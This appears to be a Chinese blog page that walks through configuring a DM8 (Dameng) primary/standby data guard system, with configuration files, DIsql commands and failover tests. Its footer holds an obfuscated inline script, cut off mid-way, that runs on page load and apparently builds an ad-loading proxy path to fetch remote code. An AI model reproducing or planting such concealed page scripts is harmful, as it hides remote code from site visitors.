+<p style="margin-left:0cm;">PORT_NUM=32141#数据库实例监听端口</p> 
+<p style="margin-left:0cm;">DW_INACTIVE_INTERVAL=60#接收守护进程消息超时时间ALTER_MODE_STATUS=0#不允许手工方式修改实例模式/状态/OGUID</p> 
+<p style="margin-left:0cm;">ENABLE_OFFLINE_TS=2#不允许备库OFFLINE表空间</p> 
+<p style="margin-left:0cm;">MAL_INI=1#打开MAL系统</p> 
+<p style="margin-left:0cm;">ARCH_INI=1#打开归档配置</p> 
+<p style="margin-left:0cm;">RLOG_SEND_APPLY_MON=64#统计最近64次的日志发送信息</p> 
+<ol><li> 
+  <ol><li> 
+    <ol><li> 
+      <ol><li>配置MAL系统</li></ol></li></ol></li></ol></li></ol> 
+<p style="margin-left:0cm;">配置MAL系统，各主备库的dmmal.ini配置必须完全一致，MAL_HOST使用内部网络IP，MAL_PORT与dm.ini中PORT_NUM使用不同的端口值，MAL_DW_PORT是各实例对应的守护进程之间，以及守护进程和监视器之间的通信端口，配置如下：</p> 
+<p style="margin-left:0cm;">MAL_CHECK_INTERVAL=5#MAL链路检测时间间隔MAL_CONN_FAIL_INTERVAL=5#判定MAL链路断开的时间[MAL_INST1]MAL_INST_NAME=GRP1_RT_01#实例名，和dm.ini中的INSTANCE_NAME一致</p> 
+<p style="margin-left:0cm;">MAL_HOST=192.168.0.141#MAL系统监听TCP连接的IP地址MAL_PORT=61141#MAL系统监听TCP连接的端口MAL_INST_HOST=192.168.1.131#实例的对外服务IP地址MAL_INST_PORT=32141#实例的对外服务端口，和dm.ini中的PORT_NUM一致MAL_DW_PORT=52141#实例本地的守护进程监听TCP连接的端口MAL_INST_DW_PORT=33141#实例监听守护进程TCP连接的端口</p> 
+<p style="margin-left:0cm;"> </p> 
+<p style="margin-left:0cm;">[MAL_INST2]</p> 
+<p style="margin-left:0cm;">MAL_INST_NAME=GRP1_RT_02</p> 
+<p style="margin-left:0cm;">MAL_HOST=192.168.0.142</p> 
+<p style="margin-left:0cm;">MAL_PORT=61142</p> 
+<p style="margin-left:0cm;">MAL_INST_HOST=192.168.1.132</p> 
+<p style="margin-left:0cm;">MAL_INST_PORT=32142</p> 
+<p style="margin-left:0cm;">MAL_DW_PORT=52142</p> 
+<p style="margin-left:0cm;">MAL_INST_DW_PORT=33142</p> 
+<ol><li> 
+  <ol><li> 
+    <ol><li> 
+      <ol><li>配置归档</li></ol></li></ol></li></ol></li></ol> 
+<p style="margin-left:0cm;">修改dmarch.ini，配置本地归档和实时归档。除了本地归档外，其他归档配置项中的ARCH_DEST表示实例是Primary模式时，需要同步归档数据的目标实例名。</p> 
+<p style="margin-left:0cm;">当前实例GRP1_RT_01是主库，需要向GRP1_RT_02（实时备库）同步数据，因此实时归档的ARCH_DEST配置为GRP1_RT_02。</p> 
+<p style="margin-left:0cm;">[ARCHIVE_REALTIME]</p> 
+<p style="margin-left:0cm;">ARCH_TYPE=REALTIME#实时归档类型</p> 
+<p style="margin-left:0cm;">ARCH_DEST=GRP1_RT_02#实时归档目标实例名</p> 
+<p style="margin-left:0cm;">[ARCHIVE_LOCAL1]</p> 
+<p style="margin-left:0cm;">ARCH_TYPE=LOCAL#本地归档类型</p> 
+<p style="margin-left:0cm;">ARCH_DEST=/dm/data/DAMENG/arch#本地归档文件存放路径ARCH_FILE_SIZE=128#单位Mb，本地单个归档文件最大值ARCH_SPACE_LIMIT=0#单位Mb，0表示无限制，范围1024~4294967294M</p> 
+<ol><li> 
+  <ol><li> 
+    <ol><li> 
+      <ol><li>配置守护进程</li></ol></li></ol></li></ol></li></ol> 
+<p style="margin-left:0cm;">修改dmwatcher.ini配置守护进程，配置为全局守护类型，使用自动切换模式。</p> 
+<p style="margin-left:0cm;">[GRP1]</p> 
+<p style="margin-left:0cm;">DW_TYPE=GLOBAL#全局守护类型</p> 
+<p style="margin-left:0cm;">DW_MODE=AUTO#自动切换模式</p> 
+<p style="margin-left:0cm;">DW_ERROR_TIME=10#远程守护进程故障认定时间INST_RECOVER_TIME=60#主库守护进程启动恢复的间隔时间</p> 
+<p style="margin-left:0cm;">INST_ERROR_TIME=10#本地实例故障认定时间</p> 
+<p style="margin-left:0cm;">INST_OGUID=453331#守护系统唯一OGUID值</p> 
+<p style="margin-left:0cm;">INST_INI=/dm/data/DAMENG/dm.ini#dm.ini配置文件路径</p> 
+<p style="margin-left:0cm;">INST_AUTO_RESTART=1#打开实例的自动启动功能INST_STARTUP_CMD=/dm/bin/dmserver#命令行方式启动RLOG_SEND_THRESHOLD=0#指定主库发送日志到备库的时间阀值，默认关闭</p> 
+<p style="margin-left:0cm;">RLOG_APPLY_THRESHOLD=0#指定备库重演日志的时间阀值，默认关闭</p> 
+<ol><li> 
+  <ol><li> 
+    <ol><li> 
+      <ol><li>启动主库</li></ol></li></ol></li></ol></li></ol> 
+<p style="margin-left:0cm;">以Mount方式启动主库</p> 
+<p style="margin-left:0cm;">./dmserver /dm/data/DAMENG/dm.ini mount</p> 
+<p style="margin-left:0cm;"><strong><span style="color:#FF0000;">注意：一定要以Mount方式启动数据库实例，否则系统启动时会重构回滚表空间，生成Redo日志；并且，启动后应用可能连接到数据库实例进行操作，破坏主备库的数据一致性。数据守护配置结束后，守护进程会自动Open数据库</span></strong></p> 
+<ol><li> 
+  <ol><li> 
+    <ol><li> 
+      <ol><li>设置OGUID</li></ol></li></ol></li></ol></li></ol> 
+<p style="margin-left:0cm;">启动命令行工具DIsql，登录主库设置OGUID值。SQL&gt;SP_SET_PARA_VALUE(1,'ALTER_MODE_STATUS',1);</p> 
+<p style="margin-left:0cm;">SQL&gt;sp_set_oguid(453331);</p> 
+<p style="margin-left:0cm;">SQL&gt;SP_SET_PARA_VALUE(1,'ALTER_MODE_STATUS',0);</p> 
+<p style="margin-left:0cm;"><strong><span style="color:#FF0000;">注意：系统通过OGUID值确定一个守护进程组，由用户保证OGUID值的唯一性，并确保数据守护系统中，数据库、守护进程和监视器配置相同的OGUID值。</span></strong></p> 
+<ol><li> 
+  <ol><li> 
+    <ol><li> 
+      <ol><li>修改数据库模式</li></ol></li></ol></li></ol></li></ol> 
+<p style="margin-left:0cm;">启动命令行工具DIsql，登录主库修改数据库为Primary模式</p> 
+<p style="margin-left:0cm;">SQL&gt;alter database primary;</p> 
+<ol><li> 
+  <ol><li> 
+    <ol><li>配置备库GRP1_RT_02 
+      <ol><li>配置dm.ini</li></ol></li></ol></li></ol></li></ol> 
+<p style="margin-left:0cm;">在DW_S1机器上配置备库的实例名为GRP1_RT_02，dm.ini参数修改如下：#实例名，建议使用“组名_守护环境_序号”的命名方式，总长度不能超过16INSTANCE_NAME=GRP1_RT_02PORT_NUM=32142#数据库实例监听端口DW_INACTIVE_INTERVAL=60#接收守护进程消息超时时间ALTER_MODE_STATUS=0#不允许手工方式修改实例模式/状态/OGUIDENABLE_OFFLINE_TS=2#不允许备库OFFLINE表空间160</p> 
+<p style="margin-left:0cm;">MAL_INI=1#打开MAL系统</p> 
+<p style="margin-left:0cm;">ARCH_INI=1#打开归档配置</p> 
+<p style="margin-left:0cm;">RLOG_SEND_APPLY_MON=64#统计最近64次的日志重演信息</p> 
+<ol><li> 
+  <ol><li> 
+    <ol><li> 
+      <ol><li>配置MAL系统</li></ol></li></ol></li></ol></li></ol> 
+<p style="margin-left:0cm;">配置MAL系统，各主备库的dmmal.ini配置必须完全一致，MAL_HOST使用内部网络IP，MAL_PORT与dm.ini中PORT_NUM使用不同的端口值，MAL_DW_PORT是各实例对应的守护进程之间，以及守护进程和监视器之间的通信端口，配置如下：</p> 
+<p style="margin-left:0cm;">MAL_CHECK_INTERVAL=5#MAL链路检测时间间隔MAL_CONN_FAIL_INTERVAL=5#判定MAL链路断开的时间[MAL_INST1]</p> 
+<p style="margin-left:0cm;">MAL_INST_NAME=GRP1_RT_01#实例名，和dm.ini中的INSTANCE_NAME一致</p> 
+<p style="margin-left:0cm;">MAL_HOST=192.168.0.141#MAL系统监听TCP连接的IP地址</p> 
+<p style="margin-left:0cm;">MAL_PORT=61141#MAL系统监听TCP连接的端口</p> 
+<p style="margin-left:0cm;">MAL_INST_HOST=192.168.1.131#实例的对外服务IP地址</p> 
+<p style="margin-left:0cm;">MAL_INST_PORT=32141#实例的对外服务端口，和dm.ini中的PORT_NUM一致</p> 
+<p style="margin-left:0cm;">MAL_DW_PORT=52141#实例对应的守护进程监听TCP连接的端口</p> 
+<p style="margin-left:0cm;">MAL_INST_DW_PORT=33141#实例监听守护进程TCP连接的端口[MAL_INST2]</p> 
+<p style="margin-left:0cm;">MAL_INST_NAME=GRP1_RT_02</p> 
+<p style="margin-left:0cm;">MAL_HOST=192.168.0.142</p> 
+<p style="margin-left:0cm;">MAL_PORT=61142</p> 
+<p style="margin-left:0cm;">MAL_INST_HOST=192.168.1.132</p> 
+<p style="margin-left:0cm;">MAL_INST_PORT=32142</p> 
+<p style="margin-left:0cm;">MAL_DW_PORT=52142</p> 
+<p style="margin-left:0cm;">MAL_INST_DW_PORT=33142</p> 
+<ol><li> 
+  <ol><li> 
+    <ol><li> 
+      <ol><li>配置归档</li></ol></li></ol></li></ol></li></ol> 
+<p style="margin-left:0cm;">修改dmarch.ini，配置本地归档和实时归档。除了本地归档外，其他归档配置项中的ARCH_DEST表示实例是Primary模式时，需要同步归档数据的目标实例名。当前实例GRP1_RT_02是备库，守护系统配置完成后，可能在各种故障处理中，GRP1_RT_02切换为新的主库，正常情况下，GRP1_RT_01会切换为新的备库，需要向GRP1_RT_01同步数据，因此实时归档的ARCH_DEST配置为GRP1_RT_01。</p> 
+<p style="margin-left:0cm;">[ARCHIVE_REALTIME]</p> 
+<p style="margin-left:0cm;">ARCH_TYPE=REALTIME#实时归档类型</p> 
+<p style="margin-left:0cm;">ARCH_DEST=GRP1_RT_01#实时归档目标实例名</p> 
+<p style="margin-left:0cm;">[ARCHIVE_LOCAL1]</p> 
+<p style="margin-left:0cm;">ARCH_TYPE=LOCAL#本地归档类型</p> 
+<p style="margin-left:0cm;">ARCH_DEST=/dm/data/DAMENG/arch#本地归档文件路径ARCH_FILE_SIZE=128#单位Mb，本地单个归档文件最大值ARCH_SPACE_LIMIT=0#单位Mb，0表示无限制，范围1024~4294967294M</p> 
+<ol><li> 
+  <ol><li> 
+    <ol><li> 
+      <ol><li>配置守护进程</li></ol></li></ol></li></ol></li></ol> 
+<p style="margin-left:0cm;">修改dmwatcher.ini配置守护进程，配置为全局守护类型，使用自动切换模式。</p> 
+<p style="margin-left:0cm;">[GRP1]</p> 
+<p style="margin-left:0cm;">DW_TYPE=GLOBAL#全局守护类型</p> 
+<p style="margin-left:0cm;">DW_MODE=AUTO#自动切换模式</p> 
+<p style="margin-left:0cm;">DW_ERROR_TIME=10#远程守护进程故障认定时间INST_RECOVER_TIME=60#主库守护进程启动恢复的间隔时间INST_ERROR_TIME=10#本地实例故障认定时间INST_OGUID=453331#守护系统唯一OGUID值</p> 
+<p style="margin-left:0cm;">INST_INI=/dm/data/DAMENG/dm.ini#dm.ini配置文件路径</p> 
+<p style="margin-left:0cm;">INST_AUTO_RESTART=1#打开实例的自动启动功能INST_STARTUP_CMD=/dm/bin/dmserver#命令行方式启动</p> 
+<p style="margin-left:0cm;">RLOG_APPLY_THRESHOLD=0#指定备库重演日志的时间阀值，默认关闭</p> 
+<ol><li> 
+  <ol><li> 
+    <ol><li> 
+      <ol><li>启动备库</li></ol></li></ol></li></ol></li></ol> 
+<p style="margin-left:0cm;">以Mount方式启动备库./dmserver /dm/data/DAMENG/dm.ini mount</p> 
+<p style="margin-left:0cm;"> </p> 
+<p style="margin-left:0cm;"><strong><span style="color:#FF0000;">注意：一定要以Mount方式启动数据库实例，否则系统启动时会重构回滚表空间，生成Redo日志；并且，启动后应用可能连接到数据库实例进行操作，破坏主备库的数据一致性。数据守护配置结束后，守护进程会自动Open数据库。</span></strong></p> 
+<ol><li> 
+  <ol><li> 
+    <ol><li> 
+      <ol><li>设置OGUID</li></ol></li></ol></li></ol></li></ol> 
+<p style="margin-left:0cm;">启动命令行工具DIsql，登录备库设置OGUID值为453331</p> 
+<p style="margin-left:0cm;">SQL&gt;SP_SET_PARA_VALUE(1,'ALTER_MODE_STATUS',1);</p> 
+<p style="margin-left:0cm;">SQL&gt;sp_set_oguid(453331);</p> 
+<p style="margin-left:0cm;">SQL&gt;SP_SET_PARA_VALUE(1,'ALTER_MODE_STATUS',0);</p> 
+<p style="margin-left:0cm;"> </p> 
+<p style="margin-left:0cm;"><strong><span style="color:#FF0000;">注意：系统通过OGUID值确定一个守护进程组，由用户保证OGUID值的唯一性，并确保数据守护系统中，数据库、守护进程和监视器配置相同的OGUID值。</span></strong></p> 
+<ol><li> 
+  <ol><li> 
+    <ol><li> 
+      <ol><li>修改数据库模式</li></ol></li></ol></li></ol></li></ol> 
+<p style="margin-left:0cm;">启动命令行工具DIsql，登录备库修改数据库为Standby模式。如果当前数据库不是Normal模式，需要先修改dm.ini中ALTER_MODE_STATUS值为1，允许修改数据库模式，修改Standby模式成功后再改回为0。如果是Normal模式，请忽略下面的第1步和第3步。</p> 
+<p style="margin-left:0cm;">SQL&gt;SP_SET_PARA_VALUE(1,'ALTER_MODE_STATUS',1);----第1步</p> 
+<p style="margin-left:0cm;">SQL&gt;alter database standby; ----第2步SQL&gt;SP_SET_PARA_VALUE(1,'ALTER_MODE_STATUS',0);----第3步</p> 
+<ol><li> 
+  <ol><li> 
+    <ol><li>配置监视器</li></ol></li></ol></li></ol> 
+<p style="margin-left:0cm;">由于主库和实时备库的守护进程配置为自动切换模式，因此这里选择配置确认监视器。和普通监视器相比，确认监视器除了相同的命令支持外，在主库发生故障时，能够自动通知实时备库接管为新的主库，具有自动故障处理的功能。</p> 
+<p style="margin-left:0cm;"> </p> 
+<p style="margin-left:0cm;"><strong><span style="color:#FF0000;">注意：故障自动切换模式下，必须配置确认监视器，且确认监视器最多只能配置一个。</span></strong></p> 
+<p style="margin-left:0cm;">修改dmmonitor.ini配置确认监视器，其中MON_DW_IP中的IP和PORT和dmmal.ini中的MAL_HOST和MAL_DW_PORT配置项保持一致。MON_DW_CONFIRM=1#确认监视器模式</p> 
+<p style="margin-left:0cm;">MON_LOG_PATH=/dm/data/log#监视器日志文件存放路径MON_LOG_INTERVAL=60#每隔60s定时记录系统信息到日志文件MON_LOG_FILE_SIZE=32#每个日志文件最大32</p> 
+<p style="margin-left:0cm;">MMON_LOG_SPACE_LIMIT=0#不限定日志文件总占用空间[GRP1]</p> 
+<p style="margin-left:0cm;">MON_INST_OGUID=453331#组GRP1的唯一OGUID值</p> 
+<p style="margin-left:0cm;">#以下配置为监视器到组GRP1的守护进程的连接信息，以“IP:PORT”的形式配置</p> 
+<p style="margin-left:0cm;">#IP对应dmmal.ini中的MAL_HOST，PORT对应dmmal.ini中的MAL_DW_PORT</p> 
+<p style="margin-left:0cm;">MON_DW_IP=192.168.0.141:52141</p> 
+<p style="margin-left:0cm;">MON_DW_IP=192.168.0.142:52142</p> 
+<ol><li> 
+  <ol><li> 
+    <ol><li>启动守护进程</li></ol></li></ol></li></ol> 
+<p style="margin-left:0cm;">启动各个主备库上的守护进程：</p> 
+<p style="margin-left:0cm;">./dmwatcher/dm/data/DAMENG/dmwatcher.ini守护进程启动后，进入Startup状态，此时实例都处于Mount状态。</p> 
+<p style="margin-left:0cm;">守护进程开始广播自身和其监控实例的状态信息，结合自身信息和远程守护进程的广播信息，守护进程将本地实例Open，并切换为Open状态。</p> 
+<ol><li> 
+  <ol><li> 
+    <ol><li>启动监视器</li></ol></li></ol></li></ol> 
+<p style="margin-left:0cm;">启动监视器：</p> 
+<p style="margin-left:0cm;">./dmmonitor /dm/data/dmmonitor.ini</p> 
+<p style="margin-left:0cm;">监视器提供一系列命令，支持当前守护系统状态查看以及故障处理，可输入help命令，查看各种命令说明使用，结合实际情况选择使用。</p> 
+<p style="margin-left:0cm;">至此一主一备的实时数据守护系统搭建完毕，在搭建步骤和各项配置都正确的情况下，在监视器上执行show命令，可以监控到所有实例都处于Open状态，所有守护进程也都处于Open状态，即为正常运行状态。</p> 
+<ol><li> 
+  <ol><li> 
+    <ol><li>注册服务</li></ol></li></ol></li></ol> 
+<p style="margin-left:0cm;">如果想让dmserver、dmwatcher和dmmonitor服务开机自启动，需要手动注册服 务，注册步骤必须用root用户进行，注册完成后重启机器时，就会自动启动dmserver、 dmwatcher和dmmonitor服务。其中，因为确认监视器一直处于工作状态，所以确认监 视器需要注册dmmonitor服务，自动启动；非确认监视器是在查看信息时才使用，届时手 动启动控制台dmmonitor服务即可，可以不用注册dmmonitor服务。详细的配置请参考 《DM8_Linux服务脚本使用手册》。</p> 
+<p style="margin-left:0cm;">切换注册服务目录下：</p> 
+<p style="margin-left:0cm;"> </p> 
+<p style="margin-left:0cm;">cd /home/dmdba/dmdbms/script/root/</p> 
+<p style="margin-left:0cm;"><strong>必须使用root用户注册服务：</strong></p> 
+<p style="margin-left:0cm;">注册守护进程服务：</p> 
+<p style="margin-left:0cm;">./dm_service_installer.sh -t dmwatcher -watcher_ini <strong><span style="color:#FF0000;">/home/dmdba/dmdatesTest/gzjTest/dmwatcher.ini </span></strong>-p dmwatcher</p> 
+<p style="margin-left:0cm;"><span style="color:#FF0000;">注意：文件路径要写绝对路径，不允许写相对路径。</span></p> 
+<p style="margin-left:0cm;"><span style="color:#000000;">注册监视器服务：</span></p> 
+<p style="margin-left:0cm;"><span style="color:#FF0000;"> ./dm_service_installer.sh -t dmmonitor -monitor_ini /home/dmdba/dmdatesTest/gzjTest/dmmonitor.ini -p dmmonitor</span></p> 
+<p style="margin-left:0cm;"><span style="color:#FF0000;"><span class="img-upload-box" id="vQdzBlOS"><span class="info-box"><img class="img-loading" src="https://images2.imgbox.com/fa/d1/gMwQgRLd_o.gif" alt="uploading.4e448015.gif"><span class="operate-box"><span class="upload-msg">转存失败</span><a class="btn btn-redo">重新上传</a><a class="btn btn-cancle">取消</a></span></span></span></span></p> 
+<p style="margin-left:0cm;"> </p> 
+<ol><li>主备测试方案 
+  <ol><li>测试数据是否同步</li></ol></li></ol> 
+<ol><li>测试主库正常状态下能否同步到备库数据</li></ol> 
+<p style="margin-left:0cm;">配置过程中，备库数据采用主库联机备份，备库还原的方式导入。</p> 
+<p style="margin-left:0cm;">测试一：</p> 
+<p style="margin-left:0cm;">       增加主库表的数据，数据必须提交才可以同步到备库。</p> 
+<p style="margin-left:0cm;"> </p> 
+<p style="margin-left:0cm;">测试二：</p> 
+<p style="margin-left:0cm;">       数据库主库先停守护进程，再停数据库服务，数据库监视器服务启动中，备库可以自动切换为主库。备库作为主库后，新增加数据。再重启主库数据库服务mount 状态，在启动守护进程。之前备库数据会自动同步到主库中。</p> 
+<p style="margin-left:0cm;"><span class="img-upload-box" id="I34aVWmv"><span class="info-box"><img class="img-loading" src="https://images2.imgbox.com/50/9e/Bzs7zJ5G_o.gif" alt="uploading.4e448015.gif"><span class="operate-box"><span class="upload-msg">转存失败</span><a class="btn btn-redo">重新上传</a><a class="btn btn-cancle">取消</a></span></span></span> <span class="img-upload-box" id="o8ITpHGZ"><span class="info-box"><img class="img-loading" src="https://images2.imgbox.com/ed/f4/g6TmXxaV_o.gif" alt="uploading.4e448015.gif"><span class="operate-box"><span class="upload-msg">转存失败</span><a class="btn btn-redo">重新上传</a><a class="btn btn-cancle">取消</a></span></span></span>      </p> 
+<p style="margin-left:0cm;"><span class="img-upload-box" id="6M9lw7E8"><span class="info-box"><img class="img-loading" src="https://images2.imgbox.com/9e/84/IwECesJG_o.gif" alt="uploading.4e448015.gif"><span class="operate-box"><span class="upload-msg">转存失败</span><a class="btn btn-redo">重新上传</a><a class="btn btn-cancle">取消</a></span></span></span></p> 
+<ol><li>测试主备之间同步时间</li></ol> 
+<p style="margin-left:0cm;">      数据同步时间&lt;1秒，5000条数据</p> 
+<p style="margin-left:0cm;"><span class="img-upload-box" id="SyMr63N9"><span class="info-box"><img class="img-loading" src="https://images2.imgbox.com/de/49/X9G7aBL7_o.gif" alt="uploading.4e448015.gif"><span class="operate-box"><span class="upload-msg">转存失败</span><a class="btn btn-redo">重新上传</a><a class="btn btn-cancle">取消</a></span></span></span></p> 
+<p style="margin-left:0cm;"><span class="img-upload-box" id="ZjjXi4tT"><span class="info-box"><img class="img-loading" src="https://images2.imgbox.com/6c/3d/mP0fVKgG_o.gif" alt="uploading.4e448015.gif"><span class="operate-box"><span class="upload-msg">转存失败</span><a class="btn btn-redo">重新上传</a><a class="btn btn-cancle">取消</a></span></span></span></p> 
+<ol><li> 
+  <ol><li>测试是否自主切换</li></ol></li></ol> 
+<p style="margin-left:0cm;">模拟主库自动宕机，监视服务启动中，备库可以及时切换，不影响使用。</p> 
+<p style="margin-left:0cm;">dm_scv.conf 配置文件：</p> 
+<p style="margin-left:0cm;">TIME_ZONE=(480)</p> 
+<p style="margin-left:0cm;">LANGUAGE=(cn)</p> 
+<p style="margin-left:0cm;"><strong><span style="color:#FF0000;">ZL=(192.168.68.131:5236,192.168.68.132:5239)</span></strong></p> 
+<p style="margin-left:0cm;">LOGIN_PRIMARY=(1)</p> 
+<p style="margin-left:0cm;">SWITCH_TIME=6000</p> 
+<p style="margin-left:0cm;">SWITCH_INTERVAL=500</p> 
+<p style="margin-left:0cm;"><strong><span style="color:#FF0000;">ZL =(192.168.68.131:5236,192.168.68.132:5239)</span></strong></p> 
+<p style="margin-left:0cm;"><strong><span style="color:#FF0000;">ZL</span></strong>代表服务名，192.168.68.131表示 ip，5236 表示端口，多个IP之间逗号隔开</p> 
+<p style="margin-left:0cm;">dm_scv.conf的位置</p> 
+<p style="margin-left:0cm;">DM 安装时生成一个配置文件 dm_svc.conf，不同的平台所在目录有所不同。</p> 
+<p style="margin-left:0cm;">1. 32 位的 DM 安装在 Win32 操作平台下，此文件位于%SystemRoot%\system32 目录；</p> 
+<p style="margin-left:0cm;">2. 64 位的 DM 安装在 Win64 操作平台下，此文件位于%SystemRoot%\system32 目录；</p> 
+<p style="margin-left:0cm;">3. 32 位的 DM 安装在 Win64 操作平台下，此文件位于%SystemRoot%\SysWOW64 目录；</p> 
+<p style="margin-left:0cm;">4. 在 Linux 平台下，此文件位于/etc 目录。</p> 
+<p style="margin-left:0cm;">jdbc.driver = dm.jdbc.driver.DmDriver</p> 
+<p style="margin-left:0cm;">jdbc.url = jdbc:dm://服务名</p> 
+<p style="margin-left:0cm;"><strong><span style="color:#FF0000;">注意：</span><span style="color:#FF0000;">dm_scv.conf </span></strong><strong><span style="color:#FF0000;">配置文件，如果配合应用使用，应用需要访问数据库，应用所在服务器必须配置此文件，配置完成后需要重启服务器才能生效。</span></strong></p>
+                </div>
+		</div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/149c3ecd62552d7b0aa79e43a1ba49c1/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">Nordic nRF52840实战学习--蓝牙广播数据包抓包解析</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/d6b9efcaf48be58a4859b3f0d8e28ecd/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">解决Linux多个本地用户之间文件共享的问题，文件夹访问Permission Denied</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 编程随想.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+
+<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X